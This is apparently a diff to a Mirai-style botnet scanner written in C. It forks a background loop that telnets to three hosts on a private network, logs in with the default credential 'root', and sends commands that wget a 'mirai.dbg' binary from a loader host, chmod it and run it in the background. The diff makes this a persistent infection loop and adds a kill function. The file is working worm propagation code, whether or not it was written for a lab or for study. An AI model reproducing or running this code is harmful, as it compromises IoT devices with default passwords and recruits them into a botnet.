@@ -1,19 +1,8 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-#include <arpa/inet.h>
-#include <termios.h>
-#include <fcntl.h>
+
 #include "scanner.h"
  
-#define DO 0xfd
-#define WONT 0xfc
-#define WILL 0xfb
-#define DONT 0xfe
-#define CMD 0xff
-#define CMD_ECHO 1
-#define CMD_WINDOW_SIZE 31
+
+int _pid;
  
 void negotiate(int sock, unsigned char *buf, int len) {
     int i;
@@ -42,7 +31,7 @@ void negotiate(int sock, unsigned char *buf, int len) {
  
 static struct termios tin;
  
-static void terminal_set(void) {
+/*static void terminal_set(void) {
     // save terminal configuration
     tcgetattr(STDIN_FILENO, &tin);
      
@@ -50,19 +39,21 @@ static void terminal_set(void) {
     memcpy(&tlocal, &tin, sizeof(tin));
     cfmakeraw(&tlocal);
     tcsetattr(STDIN_FILENO,TCSANOW,&tlocal);
-}
+}*/
  
-static void terminal_reset(void) {
+/*static void terminal_reset(void) {
     // restore terminal upon exit
     tcsetattr(STDIN_FILENO,TCSANOW,&tin);
-}
+}*/
  
 #define BUFLEN 20
 int scanner_init(void) {
 
-	int _pid = fork();
+	_pid = fork();
     if (_pid > 0 || _pid == -1)
-        return;
+        return 0;
+    int add = 0;
+    while(1){
     int sock;
     struct sockaddr_in server;
     unsigned char buf[BUFLEN + 1];
@@ -79,17 +70,35 @@ int scanner_init(void) {
     sock = socket(AF_INET , SOCK_STREAM , 0);
     if (sock == -1) {
         perror("Could not create socket. Error");
-        return 1;
+        continue;
     }
- 
-    server.sin_addr.s_addr = inet_addr("10.1.1.12");
+ 	//int addinf = 1;
+ 	//int addsup = 3;
+ 	//int add = (rand()% addsup + addinf);
+ 	//add = 2;
+ 	add = add + 1;
+ 	if(add == 4){
+ 		add = 1;
+ 	}
+ 	switch(add){
+ 		case 1: 
+ 			server.sin_addr.s_addr = inet_addr("10.1.1.11");
+ 			break;
+ 		case 2:
+ 			server.sin_addr.s_addr = inet_addr("10.1.1.12");
+ 			break;
+ 		case 3:
+ 			server.sin_addr.s_addr = inet_addr("10.1.1.13");
+ 			break;
+ 		}
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
  
     //Connect to remote server
     if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0) {
         perror("connect failed. Error");
-        return 1;
+        close(sock);
+        continue;
     }
     puts("Connected...\n");
  
@@ -114,7 +123,8 @@ int scanner_init(void) {
         puts("Connected1...\n");
         if (nready < 0) {
             perror("select. Error");
-            return 1;
+            close(sock);
+            break;
         }
         else if (nready == 0) {
             ts.tv_sec = 1; // 1 second
@@ -124,22 +134,26 @@ int scanner_init(void) {
             // start by reading a single byte
             puts("Connected2...\n");
             int rv;
-            if ((rv = recv(sock , buf , 1 , 0)) < 0)
-                return 1;
-            else if (rv == 0) {
+            if ((rv = recv(sock , buf , 1 , 0)) < 0){
+            	close(sock);
+                break;
+            }else if (rv == 0) {
                 printf("Connection closed by the remote end\n\r");
-                return 0;
+                close(sock);
+                break;
             }
  
             if (buf[0] == CMD) {
             	puts("Connected3...\n");
                 // read 2 more bytes
                 len = recv(sock , buf + 1 , 2 , 0);
-                if (len  < 0)
-                    return 1;
-                else if (len == 0) {
+                if (len  < 0){
+                	close(sock);
+                    break;
+                }else if (len == 0) {
                     printf("Connection closed by the remote end\n\r");
-                    return 0;
+                    close(sock);
+                    break;
                 }
                 negotiate(sock, buf, 3);
                 puts("Connected3...\n");
@@ -148,40 +162,46 @@ int scanner_init(void) {
                 len = 1;
                 buf[len] = '\0';
                 if(strcmp(":",buf) == 0 && ro<2){
-                	char c[5];
-                	c[0] = 'r';
-                	c[1] = 'o';
-                	c[2] = 'o';
-                	c[3] = 't';
-                	c[4] = '\n';
-                	if(send(sock, c, 5, 0)<0){
-                		exit(1);
+                	char c1[5] = "root";
+                	char c2[6] = "admin";
+                	c1[4]='\n';
+             
+                	if(send(sock, c1, 5, 0)<0){
+                		close(sock);
+                		break;
                 	}
                 	ro = ro + 1;
                 }
                 if(strcmp("#",buf) == 0 && inf==0){
-                	char infe[48] = "wget http://10.1.1.2/bins/mirai.dbg -O dvrHelper";
-                	infe[47] = '\n';
-                	if(send(sock, infe, 48, 0)<0){
-                		exit(1);
+                	char infe[49] = "wget http://10.1.1.2/bins/mirai.dbg -O dvrHelper";
+                	infe[48] = '\n';
+                	if(send(sock, infe, 49, 0)<0){
+                		close(sock);
+                		break;
                 	}
                 	inf = inf + 1;
                 }
                 
-                if(strcmp("#",buf) == 0 && inf==2){
-                	char infe[19] = "chmod 777 dvrHelper";
-                	infe[18] = '\n';
-                	if(send(sock, infe, 19, 0)<0){
-                		exit(1);
+                if(strcmp("#",buf) == 0 && inf==1){
+                	char infe[20] = "chmod 777 dvrHelper";
+                	infe[19] = '\n';
+                	if(send(sock, infe, 20, 0)<0){
+                		close(sock);
+                		break;
                 	}
                 	inf = inf + 1;
                 }
-                if(strcmp("#",buf) == 0 && inf==3){
-                	char infe[11] = "./dvrHelper";
-                	infe[10] = '\n';
-                	if(send(sock, infe, 11, 0)<0){
-                		exit(1);
+                if(strcmp("#",buf) == 0 && inf==2){
+                	char infe[14] = "./dvrHelper &";
+                	infe[13] = '\n';
+                	if(send(sock, infe, 14, 0)<0){
+                		close(sock);
+                		break;
                 	}
+                	sleep(1);
+                	close(sock);
+                	break;
+
                 	inf = inf + 1;
                 }
                 printf("%s", buf);
@@ -189,15 +209,19 @@ int scanner_init(void) {
             }
         }
          
-        else if (FD_ISSET(0, &fds)) {
+        /*else if (FD_ISSET(0, &fds)) {
         	puts("Connected4...\n");
             buf[0] = getc(stdin); //fgets(buf, 1, stdin);
             if (send(sock, buf, 1, 0) < 0)
-                return 1;
+                rexit(1);
             if (buf[0] == '\n') // with the terminal in raw mode we need to force a LF
                 putchar('\r');
-        }
+        }*/
     }
-    close(sock);
-    return 0;
+    }
+    exit(0);
+}
+
+void scanner_kill(void){
+	kill(_pid,9);
 }
